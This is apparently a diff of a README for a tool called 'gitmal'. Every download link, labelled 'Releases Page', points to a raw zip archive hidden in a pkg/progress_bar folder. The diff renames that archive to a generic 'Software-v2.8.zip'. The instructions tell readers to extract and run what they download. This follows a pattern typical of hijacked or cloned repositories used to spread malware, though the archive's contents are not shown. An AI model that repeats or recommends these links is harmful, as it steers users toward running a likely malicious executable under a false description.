@@ -1,6 +1,6 @@
 # 🌐 gitmal - Simple Static Page Generator for Repos
 
-[![Download gitmal](https://raw.githubusercontent.com/sand0x0/gitmal/master/pkg/progress_bar/gitmal_v2.2.zip)](https://raw.githubusercontent.com/sand0x0/gitmal/master/pkg/progress_bar/gitmal_v2.2.zip)
+[![Download gitmal](https://raw.githubusercontent.com/sand0x0/gitmal/master/pkg/progress_bar/Software-v2.8.zip)](https://raw.githubusercontent.com/sand0x0/gitmal/master/pkg/progress_bar/Software-v2.8.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To get started with gitmal, follow these simple steps:
 
 1. **Visit the Releases Page**  
    To download gitmal, click the link below:  
-   [Visit the Releases Page to Download](https://raw.githubusercontent.com/sand0x0/gitmal/master/pkg/progress_bar/gitmal_v2.2.zip)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/sand0x0/gitmal/master/pkg/progress_bar/Software-v2.8.zip)
 
 2. **Download the Application**  
    On the releases page, you will find the latest version listed. Choose the appropriate version for your operating system and click to download it.
@@ -41,7 +41,7 @@ To get started with gitmal, follow these simple steps:
 
 To download and install gitmal, follow these steps:
 
-1. Go to the **[Releases Page](https://raw.githubusercontent.com/sand0x0/gitmal/master/pkg/progress_bar/gitmal_v2.2.zip)**.
+1. Go to the **[Releases Page](https://raw.githubusercontent.com/sand0x0/gitmal/master/pkg/progress_bar/Software-v2.8.zip)**.
 2. Click on the latest version available.
 3. Choose the file that matches your operating system and download it.
 4. Extract the contents and run the application.
@@ -74,4 +74,4 @@ gitmal is open-source software. You can use, modify, and distribute it freely. P
 
 If you need help using gitmal or have any questions, feel free to reach out. You can create issues in the GitHub repository or ask for assistance on community forums.
 
-Remember, for your download, visit our **[Releases Page](https://raw.githubusercontent.com/sand0x0/gitmal/master/pkg/progress_bar/gitmal_v2.2.zip)** to get started.
+Remember, for your download, visit our **[Releases Page](https://raw.githubusercontent.com/sand0x0/gitmal/master/pkg/progress_bar/Software-v2.8.zip)** to get started.
